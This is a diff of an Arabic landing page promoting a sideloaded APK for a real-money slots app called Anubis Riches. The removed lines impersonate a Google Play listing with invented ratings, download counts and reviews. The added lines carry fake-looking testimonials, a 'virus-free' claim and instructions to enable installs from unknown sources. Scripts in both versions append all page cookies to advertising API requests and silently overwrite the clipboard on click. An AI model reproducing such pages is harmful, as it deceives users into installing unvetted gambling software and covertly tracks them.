@@ -1,10 +1,8 @@
 <!DOCTYPE html>
-<!-- saved from url=(0048)https://anubisriches-adv.pages.dev/store/apps/details/ -->
-<html lang="en" style="cursor: pointer">
+<html lang="ar" dir="rtl">
   <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta property="og:locale" content="ar_EG" />
     <meta
       property="og:title"
@@ -13,17 +11,17 @@
     <meta property="og:description" content="سحب نقدي سريع" />
     <meta
       property="og:image"
-      content="https://anubisriches-adv.pages.dev/instantview_pg_ar.jpg"
+      content="https://www.anubisriches.com/ogimage.jpg"
     />
     <meta
       property="og:image:secure_url"
-      content="https://anubisriches-adv.pages.dev/instantview_pg_ar.jpg"
+      content="https://www.anubisriches.com/ogimage.jpg"
     />
-    <meta property="og:image:width" content="600" />
-    <meta property="og:image:height" content="338" />
-    <meta property="og:url" content="https://anubisriches-adv.pages.dev/" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:url" content="https://www.anubisriches.com/" />
     <meta property="og:type" content="article" />
-    <meta property="article:modified_time" content="2025-01-07T12:53:37+0000" />
+    <meta property="article:modified_time" content="2026-03-05T12:53:37+0000" />
     <meta property="article:author" content="" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta
@@ -31,714 +29,409 @@
       content="Anubis Riches - مكافأة الإحالة | ألعاب شائعة | ربح جوائز كبيرة بسهولة |"
     />
     <meta name="twitter:description" content="سحب نقدي سريع" />
-    <link rel="shortcut icon" href="/favicon.ico" />
-    <title>Anubis Riches</title>
+    <title>أنوبيس ريتشز - أفضل ألعاب السلوتس</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Amiri&display=swap"
+      rel="stylesheet"
+    />
     <style>
-      html,
-      body {
-        margin: 0;
-        padding: 0;
-        font-family: "Arial", sans-serif;
+      :root {
+        --primary: #8e2de2;
+        --accent: #f9a825;
+        --dark-bg: #0e0b16;
+        --card-bg: #1e1b2d;
+        --text-light: #ffffff;
+        --text-muted: #ccc;
+        --button-hover: #ffd54f;
+      }
+
+      * {
+        box-sizing: border-box;
       }
 
       body {
-        -webkit-font-smoothing: antialiased;
-        /* font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; */
-        color: rgba(0, 0, 0, 0.87);
-        padding: 16px;
-        max-width: 500px;
-        margin: auto;
+        margin: 0;
+        font-family: "Amiri", serif;
+        background-color: var(--dark-bg);
+        color: var(--text-light);
+        line-height: 1.6;
         direction: rtl;
       }
 
-      h3 {
-        height: 28px;
-        size: 28px;
-        text-align: right;
-      }
-
-      img {
-        margin: 0;
-        padding: 0;
-      }
-
-      span {
-        display: inline-block;
-        height: 100%;
+      a {
+        text-decoration: none;
+        color: inherit;
       }
 
       header {
+        background: linear-gradient(135deg, var(--primary), #4a00e0);
+        padding: 80px 20px;
+        text-align: center;
+        color: var(--text-light);
+      }
+
+      header h1 {
+        font-size: 3rem;
+        margin: 0;
+      }
+
+      header p {
+        font-size: 1.3rem;
+        margin: 20px 0 30px;
+        color: var(--text-muted);
+      }
+
+      .cta-buttons {
         display: flex;
-        margin-bottom: 3rem;
-        text-align: right;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
       }
 
-      header div {
-        line-height: 56px;
+      .cta-buttons a {
+        display: inline-block;
+        background: var(--accent);
+        color: #000;
+        padding: 14px 28px;
+        margin: 10px;
+        border-radius: 50px;
+        font-weight: bold;
+        transition: background 0.3s ease;
       }
 
-      header .p2 {
-        margin-left: 40px;
+      .cta-buttons a:hover {
+        background: var(--button-hover);
       }
 
-      .p2 img {
-        padding-left: 1rem;
+      section {
+        padding: 60px 20px;
+        max-width: 1100px;
+        margin: auto;
       }
 
-      .icon {
-        width: 24px;
-        height: 24px;
-        margin: 0px;
-        padding: 3px;
+      section:nth-child(2),
+      section:nth-child(3) {
+        padding-bottom: 0;
       }
 
-      .tag {
-        flex: 1;
-        position: relative;
+      h2 {
+        text-align: center;
+        font-size: 2rem;
+        margin-bottom: 40px;
       }
 
-      .tag::after {
-        content: "";
-        position: absolute;
-        top: 35px;
-        right: -10px;
-        bottom: 10px;
-        width: 2px;
-        background-color: #797676;
-      }
-
-      .slider {
+      .features,
+      .showcase,
+      .reviews {
         display: flex;
-        animation: slide-left 30s linear infinite;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 25px;
       }
 
-      .slider img {
-        flex: 0 0 auto;
+      .feature,
+      .game-card,
+      .review {
+        background: var(--card-bg);
+        padding: 25px;
+        border-radius: 16px;
+        flex: 1 1 300px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        transition: transform 0.3s ease;
+      }
+
+      .feature:hover,
+      .game-card:hover,
+      .review:hover {
+        transform: translateY(-5px);
+      }
+
+      .game-card img {
         width: 100%;
-        height: auto;
+        border-radius: 12px;
+        margin-bottom: 15px;
       }
 
-      .box-item {
-        margin-bottom: 20px;
+      .review {
+        text-align: center;
       }
 
-      .gamename img {
-        height: 2.2rem;
+      .review strong {
+        display: block;
+        margin-top: 10px;
+        color: var(--accent);
       }
 
-      .l4 {
-        margin-top: 4rem;
+      .download {
+        text-align: center;
+        background: #1f1b2c;
+        border-top: 2px solid var(--primary);
       }
 
-      .l3,
-      .l2,
-      .l1 {
-        margin-top: 3rem;
+      .faq {
+        max-width: 800px;
+        margin: auto;
       }
 
-      .l2 span {
-        margin-right: 1rem;
-        padding: 0;
+      .faq h4 {
+        color: var(--accent);
+        margin-top: 25px;
+        margin-bottom: 5px;
       }
 
-      .l1 span {
-        margin-right: 1rem;
-        padding: 0;
+      footer {
+        background: var(--dark-bg);
+        padding: 40px 20px;
+        text-align: center;
+        font-size: 0.9em;
+        color: var(--text-muted);
+        border-top: 1px solid #2c2c3a;
       }
 
+      footer a {
+        color: var(--text-muted);
+        margin: 0 8px;
+      }
+
+      img.qr {
+        margin-top: 10px;
+        width: 120px;
+        height: 120px;
+        border-radius: 12px;
+      }
+
+      @media (max-width: 768px) {
+        header h1 {
+          font-size: 2.2rem;
+        }
+        .cta-buttons a {
+          margin: 8px 5px;
+          padding: 12px 20px;
+          font-size: 0.9rem;
+        }
+      }
+      #qrcode_2 {
+        width: 120px;
+      }
       /* 添加样式以表示链接处于禁用状态 */
       .disabledURL {
         pointer-events: none;
         color: gray;
       }
     </style>
-    <script>
-      document.addEventListener("DOMContentLoaded", () => {
-        const slider = document.querySelector(".slider");
-        if (!slider) return;
-
-        const getX = (e) => (e.touches ? e.touches[0].clientX : e.clientX);
-        let isDragging = false;
-        let startPos = 0;
-        let currentTranslate = 0;
-        let prevTranslate = 0;
-
-        const startDrag = (e) => {
-          startPos = getX(e);
-          if (!e.touches) e.preventDefault();
-          isDragging = true;
-          slider.classList.add("grabbing");
-        };
-
-        const drag = (e) => {
-          if (!isDragging) return;
-          const diff = getX(e) - startPos;
-          currentTranslate = prevTranslate + diff;
-          if (currentTranslate < -300 || currentTranslate > 0) {
-            currentTranslate = 0;
-          }
-          slider.style.transform = `translateX(${currentTranslate}px)`;
-        };
-
-        const endDrag = () => {
-          if (!isDragging) return;
-          isDragging = false;
-          slider.classList.remove("grabbing");
-          prevTranslate = currentTranslate;
-        };
-
-        slider.addEventListener("mousedown", startDrag);
-        slider.addEventListener("touchstart", startDrag, { passive: true });
-        document.addEventListener("mousemove", drag);
-        document.addEventListener("touchmove", drag, { passive: true });
-        document.addEventListener("mouseup", endDrag);
-        document.addEventListener("touchend", endDrag);
-      });
-    </script>
   </head>
-
   <body>
-    <header
-      style="display: flex; justify-content: space-between; align-items: center"
-    >
-      <div style="height: 56px; margin-left: auto"></div>
-      <div class="p2" style="margin-right: auto; display: flex; gap: 1rem">
-        <img src="/files/search.png" alt="" class="icon" />
-        <img src="/files/q.png" alt="" class="icon" />
-        <img src="/files/lg.png" alt="" class="icon" />
+    <header>
+      <h1>Anubis Riches</h1>
+      <p>استمتع بأحدث ألعاب السلوتس واربح جوائز ضخمة في أي وقت ومن أي مكان</p>
+      <div class="cta-buttons">
+        <a
+          id="dapk"
+          class="disabledURL"
+          href="https://downloads.anubisriches.com/anubisriches.prod.2.14.apk"
+          onclick="onClickBtn()"
+          >تحميل للأندرويد</a
+        >
+        <p>امسح ضوئيًا للتنزيل:</p>
+        <div id="qrcode_2"></div>
       </div>
     </header>
 
-    <div style="display: flex">
-      <img src="/files/appicon1.jpg" alt="" style="height: 72px; width: 72px" />
-      <div style="height: 72px; vertical-align: text-top; margin-right: auto">
-        <div>
-          <h5
-            style="padding: 0; margin: 0; font-size: 1.2rem; padding-left: 1rem"
-          >
-            Anubis Riches
-          </h5>
+    <section>
+      <h2>لماذا أنوبيس ريتشز؟</h2>
+      <div class="features">
+        <div class="feature">
+          <h3>🎰 أكثر من ١٠٠ لعبة سلوت</h3>
+          <p>
+            استمتع بالألعاب الكلاسيكية والعصرية مثل الفواكه، الكنوز، وأسرار
+            الفراعنة.
+          </p>
         </div>
-        <h4
-          style="
-            color: #01875f;
-            padding-left: 1rem;
-            padding: 0;
-            margin: 0;
-            padding-left: 1rem;
-            font-size: 1.1rem;
-          "
+        <div class="feature">
+          <h3>💰 مكافآت يومية</h3>
+          <p>احصل على عملات مجانية ولفات يومية دون الحاجة للشراء.</p>
+        </div>
+        <div class="feature">
+          <h3>🌍 ترتيب عالمي</h3>
+          <p>نافس لاعبين من جميع أنحاء العالم وكن في القمة!</p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <h2>أفضل الألعاب</h2>
+      <div class="showcase">
+        <div class="game-card">
+          <img src="./static/luckyFrog.png" alt="الضفدع المحظوظ" />
+          <h4>الضفدع المحظوظ</h4>
+          <p>
+            لقد جاءت ضفادع المال المسافرة من جميع أنحاء العالم إلى مدينتك
+            مؤخرًا، ويقال إنها قادرة على جلب الثروة للناس!
+          </p>
+        </div>
+        <div class="game-card">
+          <img src="./static/kaChing.png" alt="كا تشينغ" />
+          <h4>كا تشينغ</h4>
+          <p>
+            كا-تشينغ لعبة كلاسيكية تعتمد على صناديق الرهان العمياء. تتميز بنطاق
+            رهان واسع جدًا وآلية لعب مبتكرة بدون بكرات تُمكّن اللاعبين من تعديل
+            تقلباتهم باختيار اللعبة الأساسية فقط. ليس كل صندوق فائزًا، لكن كل
+            صندوق يمنح اللاعبين فرصة ربح نقاط، أو صناديق إضافية، أو عملات معدنية
+            لملء الحقيبة العلوية للفوز بواحدة من ثلاث مكافآت مثيرة.
+          </p>
+        </div>
+        <div class="game-card">
+          <img src="./static/manekiNeko.png" alt="قطة محظوظة" />
+          <h4>قطة محظوظة</h4>
+          <p>
+            مانيكي نيكو موجود في كل مكان. بصفته رمزًا للثقافة الآسيوية، يُعتبر
+            تميمة حظ، وله تاريخ عريق. الآن يمكنك رؤيته في اللعبة. كما يتميز
+            بميزات عديدة في طريقة اللعب، ويمكنك الاستمتاع بدورات مجانية مع
+            مضاعفات ربح، ورموز مكدسة، ورموز برية، وغيرها الكثير.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <h2>آراء اللاعبين</h2>
+      <div class="reviews">
+        <div class="review">
+          <p>“أفضل لعبة سلوت لعبتها على الإطلاق! ممتعة للغاية.”</p>
+          <strong>– سارة</strong>
+        </div>
+        <div class="review">
+          <p>“رسومات مذهلة ومكافآت رائعة. مدمن عليها!”</p>
+          <strong>– كريم</strong>
+        </div>
+        <div class="review">
+          <p>“أشعر وكأني في كازينو فيغاس. أنصح بها بشدة.”</p>
+          <strong>– حسام</strong>
+        </div>
+      </div>
+    </section>
+
+    <section class="download">
+      <h2>جاهز للربح؟</h2>
+      <p>حمل تطبيق أنوبيس ريتشز الآن على أندرويد.</p>
+      <div class="cta-buttons">
+        <a
+          id="dapk_2"
+          class="disabledURL"
+          href="https://downloads.anubisriches.com/anubisriches.prod.2.14.apk"
+          onclick="onClickBtn()"
+          >تحميل APK</a
         >
-          Anubis Riches
-        </h4>
-        <div style="padding-left: 1rem; font-size: 0.9rem">
-          يتضمن إعلانات وشراء داخل التطبيق
-        </div>
       </div>
-    </div>
-    <div style="height: 1rem"></div>
+      <p>امسح الكود للتحميل:</p>
+      <div id="qrcode" style="margin: 20px auto; width: 120px"></div>
+    </section>
 
-    <div style="display: flex" class="ads">
-      <div style="width: 40%; padding-top: 1.5rem" class="tag">
-        <div
-          style="
-            text-align: center;
-            height: 1.5rem;
-            padding-bottom: 0.5rem;
-            font-weight: bold;
-          "
-        >
-          4.2
-          <img src="/files/bstart.png" alt="" style="height: 0.8rem" />
-        </div>
-        <div style="text-align: center; font-size: 0.8rem">
-          2.83 مليون مراجعة
-        </div>
-      </div>
-
-      <div style="width: 30%; padding-top: 1.5rem" class="tag">
-        <div
-          style="
-            text-align: center;
-            height: 1.5rem;
-            padding-bottom: 0.5rem;
-            font-weight: bold;
-          "
-        >
-          +1000 مليون
-        </div>
-        <div style="text-align: center; font-size: 0.8rem">عملية تنزيل</div>
-      </div>
-
-      <div style="width: 30%; padding-top: 1.5rem" class="tag">
-        <div
-          style="
-            text-align: center;
-            height: 1.5rem;
-            padding-bottom: 0.5rem;
-            font-weight: bold;
-          "
-        >
-          <img src="/files/18+.png" alt="" style="height: 1.2rem" />
-        </div>
-        <div style="text-align: center; font-size: 0.8rem">
-          مناسب لأعمار 18 عامًا وما فوق
-        </div>
-      </div>
-    </div>
-
-    <div onclick="onClickBtn()">
-      <a
-        id="dapk"
-        class=""
-        href="https://downloads.afbgaming.app/anubisriches.prod.2.14.apk"
-        ><img
-          style="padding-top: 30px; width: 100%"
-          src="/files/install.png"
-          alt=""
-          height="48px"
-      /></a>
-    </div>
-
-    <!-- <div style="display: flex; align-items: center; justify-content: center; margin: 2rem 0;">
-    <img src="./img/share.png" alt="" style="height: 1.5rem; margin-right: 1rem;">
-    <div>share</div>
-  </div> -->
-
-    <div style="display: flex; align-items: center">
-      <img
-        src="/files/device.png"
-        alt=""
-        style="height: 1rem; margin-left: 1rem"
-      />
-      متاح على جميع أجهزتك
-    </div>
-
-    <div style="margin-top: 3rem; overflow: hidden; height: 206px">
-      <div class="slider">
-        <img
-          src="/files/image1.jpg"
-          alt=""
-          style="padding-left: 1rem; height: 206px; width: 116px"
-        />
-        <img
-          src="/files/image2.jpg"
-          alt=""
-          style="padding-left: 1rem; height: 206px; width: 116px"
-        />
-        <img
-          src="/files/image3.jpg"
-          alt=""
-          style="padding-left: 1rem; height: 206px; width: 116px"
-        />
-        <img
-          src="/files/image4.jpg"
-          alt=""
-          style="padding-left: 1rem; height: 206px; width: 116px"
-        />
-      </div>
-    </div>
-
-    <div>
-      <h3>الوظيفة الجديدة</h3>
-      <p>إصلاحات الأخطاء والتحسينات</p>
-    </div>
-
-    <div>
-      <h3>أمان البيانات</h3>
+    <section class="faq">
+      <h2>الأسئلة الشائعة</h2>
+      <h4>هل اللعبة مجانية؟</h4>
       <p>
-        يبدأ الأمان بفهم كيفية جمع المطورين للبيانات ومشاركتها. قد تختلف حماية
-        الخصوصية وقياسات الأمان حسب الاستخدام والموقع والعمر. يتم تقديم هذه
-        المعلومات من قبل المطور وقد يتم تحديثها مع مرور الوقت.
+        لا، Anubis Riches هي لعبة بأموال حقيقية ويمكنك الفوز بجوائز كبرى بأموال
+        حقيقية.
       </p>
-    </div>
-
-    <div style="border: 1px solid #979595; border-radius: 20px; padding: 1rem">
-      <div style="display: flex" class="box-item">
-        <div style="width: 10%; padding-right: 1rem">
-          <img src="/files/k1.png" alt="" style="height: 1.2rem" />
-        </div>
-        <div style="width: 90%; float: left">
-          <p style="padding: 0; margin: 0">
-            لا تتم مشاركة البيانات مع أطراف ثالثة <br />
-            <span style="text-decoration: underline">تعلم المزيد عن</span> كيفية
-            إعلان المطورين عن مشاركة البيانات
-          </p>
-        </div>
-      </div>
-
-      <div style="display: flex" class="box-item">
-        <div style="width: 10%; padding-right: 1rem">
-          <img src="/files/k2.png" alt="" style="height: 1.2rem" />
-        </div>
-        <div style="width: 90%; float: left">
-          قد تجمع هذه التطبيق أنواع البيانات التالية: معلومات الموقع، معلومات
-          شخصية، وأربع أنواع أخرى من البيانات
-        </div>
-      </div>
-
-      <div style="display: flex" class="box-item">
-        <div style="width: 10%; padding-right: 1rem">
-          <img src="/files/k3.png" alt="" style="height: 1.2rem" />
-        </div>
-        <div style="width: 90%; float: left">البيانات لن تكون مشفرة</div>
-      </div>
-
-      <div style="display: flex" class="box-item">
-        <div style="width: 10%; padding-right: 1rem">
-          <img src="/files/k4.png" alt="" style="height: 1.2rem" />
-        </div>
-        <div style="width: 90%; float: left">
-          يمكنك طلب من المطور حذف البيانات
-        </div>
-      </div>
-
-      <div style="color: #01875f; font-weight: bold; margin-left: 1rem">
-        تفقد التفاصيل
-      </div>
-    </div>
-
-    <div style="margin-top: 2rem">
-      <h3 style="padding-bottom: 0.5rem; margin: 0">قيم هذه اللعبة</h3>
-      <p style="padding-bottom: 2rem; margin: 0">شارك أفكارك</p>
-      <div>
-        <img
-          src="/files/phone.png"
-          alt=""
-          style="height: 2rem; margin-top: 2rem"
-        />
-      </div>
-      <div style="margin: 1rem 0">
-        <img
-          src="/files/wstar.png"
-          alt=""
-          style="height: 2rem; padding-right: 0.6rem"
-        />
-        <img
-          src="/files/wstar.png"
-          alt=""
-          style="height: 2rem; padding-right: 0.6rem"
-        />
-        <img
-          src="/files/wstar.png"
-          alt=""
-          style="height: 2rem; padding-right: 0.6rem"
-        />
-        <img
-          src="/files/wstar.png"
-          alt=""
-          style="height: 2rem; padding-right: 0.6rem"
-        />
-        <img src="/files/wstar.png" alt="" style="height: 2rem" />
-      </div>
-
-      <div>
-        <img src="/files/review.png" alt="" srcset="" style="height: 2rem" />
-      </div>
-    </div>
-
-    <div style="direction: rtl; text-align: right">
-      <h3>التقييمات والمراجعات</h3>
-      <p style="font-size: 0.8rem">
-        تم التحقق من التقييمات والمراجعات
-        <img src="/files/i.png" alt="" style="height: 0.8rem" />
-      </p>
-
-      <div
-        style="display: flex; margin-top: 2rem; justify-content: space-between"
-      >
-        <div style="width: 40%; padding-right: 1rem">
-          <div style="font-size: 4rem">5.0</div>
-          <img src="/files/bfs.png" alt="" style="height: 1.5rem" />
-          <div>1.83 مليون مراجعة</div>
-        </div>
-        <div style="width: 60%">
-          <div>5 <img src="/files/p5.png" alt="" style="width: 80%" /></div>
-          <div>4 <img src="/files/p4.png" alt="" style="width: 80%" /></div>
-          <div>3 <img src="/files/p3.png" alt="" style="width: 80%" /></div>
-          <div>2 <img src="/files/p3.png" alt="" style="width: 80%" /></div>
-          <div>1 <img src="/files/p1.png" alt="" style="width: 80%" /></div>
-        </div>
-      </div>
-
-      <div style="margin-top: 2rem">
-        <div style="display: flex; align-items: center; height: 4rem">
-          <div
-            style="
-              display: flex;
-              justify-content: space-between;
-              align-items: center;
-            "
-          >
-            <img src="/files/h1.png" alt="" style="height: 2rem" />
-            <span style="margin-left: 1rem">bakdoe tenzin</span>
-          </div>
-          <div style="height: 2rem; line-height: 2.5rem; margin-left: auto">
-            <img
-              src="/files/point.png"
-              alt=""
-              style="height: 1rem; margin-right: 2rem"
-            />
-          </div>
-        </div>
-        <div
-          style="
-            display: flex;
-            align-items: center;
-            height: 2rem;
-            justify-content: flex-end;
-          "
-        >
-          <img src="/files/small.png" alt="" style="margin-right: 1rem" /> يونيو
-          25, 2023
-        </div>
-        <div>
-          <p>مسلية وممتعة لساعات!</p>
-          <p>15 شخصاً وجدوا هذه المراجعة مفيدة</p>
-          <p style="display: flex; align-items: center">
-            <span>هل وجدت هذه المراجعة مفيدة؟</span>
-            <img
-              src="/files/yes.png"
-              alt=""
-              style="height: 1.5rem; margin-left: 3rem"
-            />
-            <img src="/files/no .png" alt="" style="height: 1.5rem" />
-          </p>
-        </div>
-      </div>
-
-      <div style="margin-top: 2rem">
-        <div style="display: flex; align-items: center; height: 4rem">
-          <div
-            style="
-              display: flex;
-              justify-content: space-between;
-              align-items: center;
-            "
-          >
-            <img src="/files/h2.png" alt="" style="height: 2.5rem" />
-            <span style="margin-left: 1rem">nick cook</span>
-          </div>
-          <div style="height: 2rem; line-height: 2rem; margin-left: auto">
-            <img
-              src="/files/point.png"
-              alt=""
-              style="height: 1rem; margin-right: 2rem"
-            />
-          </div>
-        </div>
-        <div
-          style="
-            display: flex;
-            align-items: center;
-            height: 2rem;
-            justify-content: flex-end;
-          "
-        >
-          <img src="/files/small.png" alt="" style="margin-right: 1rem" /> أبريل
-          30, 2023
-        </div>
-        <div>
-          <p>رسومات وأسلوب لعب عالي الجودة.</p>
-          <p>5 أشخاص وجدوا هذه المراجعة مفيدة</p>
-          <p style="display: flex; align-items: center">
-            <span>هل وجدت هذه المراجعة مفيدة؟</span>
-            <img
-              src="/files/yes.png"
-              alt=""
-              style="height: 1.5rem; margin-left: 3rem"
-            />
-            <img src="/files/no .png" alt="" style="height: 1.5rem" />
-          </p>
-        </div>
-      </div>
-
-      <div style="margin-top: 2rem">
-        <div style="display: flex; align-items: center; height: 4rem">
-          <div
-            style="
-              display: flex;
-              justify-content: space-between;
-              align-items: center;
-            "
-          >
-            <img src="/files/h3.png" alt="" style="height: 2.5rem" />
-            <span style="margin-left: 1rem">Fatt Foo</span>
-          </div>
-          <div style="height: 2rem; line-height: 2rem; margin-left: auto">
-            <img
-              src="/files/point.png"
-              alt=""
-              style="height: 1rem; margin-right: 2rem"
-            />
-          </div>
-        </div>
-        <div
-          style="
-            display: flex;
-            align-items: center;
-            height: 2rem;
-            justify-content: flex-end;
-          "
-        >
-          <img src="/files/small.png" alt="" style="margin-right: 1rem" /> يونيو
-          12, 2023
-        </div>
-        <div>
-          <p>يتم تحديثه باستمرار بمحتوى جديد.</p>
-          <p>5 أشخاص وجدوا هذه المراجعة مفيدة</p>
-          <p style="display: flex; align-items: center">
-            <span>هل وجدت هذه المراجعة مفيدة؟</span>
-            <img
-              src="/files/yes.png"
-              alt=""
-              style="height: 1.5rem; margin-left: 3rem"
-            />
-            <img src="/files/no .png" alt="" style="height: 1.5rem" />
-          </p>
-        </div>
-      </div>
-
-      <div style="color: #01875f; font-weight: bold; margin-left: 1rem">
-        عرض جميع المراجعات
-      </div>
-
-      <div style="display: flex; align-items: center; height: 4rem">
-        <div
-          style="
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-          "
-        >
-          <h3 style="margin-right: 1rem">مقدمة اللعبة</h3>
-        </div>
-        <div style="height: 2rem; line-height: 2rem; margin-left: auto">
-          <img
-            src="/files/v1.png"
-            alt=""
-            style="height: 1rem; margin-right: 2rem"
-          />
-        </div>
-      </div>
+      <h4>كيف يمكن تثبيت ملف APK؟</h4>
       <p>
-        العب Teenpatti (Indian Poker)، Cricket، Rummy، Poker و Andar Behar في
-        الوقت الفعلي مع ملايين اللاعبين من جميع أنحاء العالم!
+        قم بتحميل الملف، واسمح بالتثبيت من مصادر غير معروفة، ثم اضغط للتثبيت.
       </p>
+      <h4>هل التطبيق آمن؟</h4>
+      <p>نعم، التطبيق خالٍ من الفيروسات والإعلانات.</p>
+    </section>
 
-      <p>لعبة مجانية!</p>
-      <p>...</p>
-
-      <h3>التحديثات</h3>
-      <p>11 أكتوبر 2023</p>
-
-      <div class="l4">
-        <p>Play Pass</p>
-        <p>Play Points</p>
-        <p>بطاقة الهدايا</p>
-        <p>التبادل</p>
-        <p>سياسة الاسترداد</p>
-      </div>
-
-      <div class="l3">
-        <p>الأطفال والعائلات</p>
-        <p>دليل الوالدين</p>
-        <p>المشاركة المنزلية</p>
-      </div>
-
-      <div class="l2">
-        <div>
-          <span>شروط الخدمة</span>
-          <span>الخصوصية</span>
-        </div>
-      </div>
-
-      <script src="/files/Adjustscript.js"></script>
-
-      <script>
-        const APK_URL =
-          "https://downloads.afbgaming.app/anubisriches.prod.2.14.apk";
-        const API_BASE = "https://api.anubisriches.com/api/advertising";
-        const urlParams = new URLSearchParams(window.location.search);
-
-        function getCookie(name) {
-          const match = document.cookie.match(
-            new RegExp("(?:^|; )" + name + "=([^;]*)")
-          );
-          return match ? match[1] : null;
-        }
-
-        function getUrl(url) {
-          const cookieQuery = document.cookie.replace(/; ?/g, "&");
-          const sep = window.location.search ? "&" : "?";
-          const requestUrl =
-            url + (window.location.search || "") + sep + cookieQuery;
-          console.log("requestUrl", requestUrl);
-          return requestUrl;
-        }
-
-        function reportEvent(path, label) {
-          fetch(getUrl(`${API_BASE}/${path}`)).then(
-            (r) => r.ok && console.log(label)
-          );
-        }
-
-        function buildLink() {
-          const trackUrl = buildURL(
-            urlParams.get("ajtoken"),
-            urlParams.get("p1"),
-            urlParams.get("p2"),
-            urlParams.get("p3"),
-            urlParams.get("p4"),
-            urlParams.get("p5"),
-            urlParams.get("p6"),
-            urlParams.get("fbclid"),
-            getFbPid()
-          );
-          return trackUrl
-            ? trackUrl + "&redirect=" + encodeURIComponent(APK_URL)
-            : APK_URL;
-        }
-
-        window.onload = function () {
-          const link = buildLink();
-          console.log("link", link);
-          const apkLink = document.getElementById("dapk");
-          apkLink.href = link;
-          apkLink.classList.remove("disabledURL");
-          reportEvent("onshow", "show");
-        };
-
-        function onClickBtn() {
-          reportEvent("ondownload", "click");
-          const { location } = window;
-          const payload = {
-            fbc: urlParams.get("fbclid") || "",
-            fbp: getCookie("_fbp") || "",
-            leadId: urlParams.get("leadId") || "",
-            link: getUrl(location.origin + location.pathname),
-          };
-          const textArea = document.createElement("textarea");
-          textArea.value = JSON.stringify(payload);
-          document.body.appendChild(textArea);
-          textArea.select();
-          document.execCommand("copy");
-          textArea.remove();
-        }
-      </script>
-
-      <deepl-input-controller
-        ><template shadowrootmode="open">
-          <link
-            rel="stylesheet"
-            href="chrome-extension://cofdbpoegempjloogbagkncekinflcnj/build/content.css"
-          />
-          <div>
-            <div class="dl-input-translation-container svelte-ju4595">
-              <div></div>
-            </div>
-          </div> </template
-      ></deepl-input-controller>
-    </div>
+    <footer>
+      <p>© ٢٠٢٥ أنوبيس ريتشز. جميع الحقوق محفوظة.</p>
+      <p><a href="#">شروط الاستخدام</a> | <a href="#">سياسة الخصوصية</a></p>
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="./static/Adjustscript.js"></script>
   </body>
+  <script>
+    const APK_URL =
+      "https://downloads.anubisriches.com/anubisriches.prod.2.14.apk";
+    const API_BASE = "https://api.anubisriches.com/api/advertising";
+    const urlParams = new URLSearchParams(window.location.search);
+    const QR_OPTS = {
+      text: APK_URL,
+      width: 120,
+      height: 120,
+      colorDark: "#000000",
+      colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.H,
+    };
+
+    ["qrcode", "qrcode_2"].forEach((id) => {
+      new QRCode(document.getElementById(id), QR_OPTS);
+    });
+
+    function getCookie(name) {
+      const match = document.cookie.match(
+        new RegExp("(?:^|; )" + name + "=([^;]*)")
+      );
+      return match ? match[1] : null;
+    }
+
+    function getUrl(url) {
+      const cookieQuery = document.cookie.replace(/; ?/g, "&");
+      const sep = window.location.search ? "&" : "?";
+      const requestUrl =
+        url + (window.location.search || "") + sep + cookieQuery;
+      console.log("requestUrl", requestUrl);
+      return requestUrl;
+    }
+
+    function reportEvent(path, label) {
+      fetch(getUrl(`${API_BASE}/${path}`)).then(
+        (r) => r.ok && console.log(label)
+      );
+    }
+
+    function buildLink() {
+      const trackUrl = buildURL(
+        urlParams.get("ajtoken"),
+        urlParams.get("p1"),
+        urlParams.get("p2"),
+        urlParams.get("p3"),
+        urlParams.get("p4"),
+        urlParams.get("p5"),
+        urlParams.get("p6"),
+        urlParams.get("fbclid"),
+        getFbPid()
+      );
+      return trackUrl
+        ? trackUrl + "&redirect=" + encodeURIComponent(APK_URL)
+        : APK_URL;
+    }
+
+    window.onload = function () {
+      const link = buildLink();
+      console.log("link", link);
+      ["dapk", "dapk_2"].forEach((id) => {
+        const el = document.getElementById(id);
+        el.href = link;
+        el.classList.remove("disabledURL");
+      });
+      reportEvent("onshow", "show");
+    };
+
+    function onClickBtn() {
+      reportEvent("ondownload", "click");
+      const { location } = window;
+      const payload = {
+        fbc: urlParams.get("fbclid") || "",
+        fbp: getCookie("_fbp") || "",
+        leadId: urlParams.get("leadId") || "",
+        link: getUrl(location.origin + location.pathname),
+      };
+      const textArea = document.createElement("textarea");
+      textArea.value = JSON.stringify(payload);
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      textArea.remove();
+    }
+  </script>
 </html>
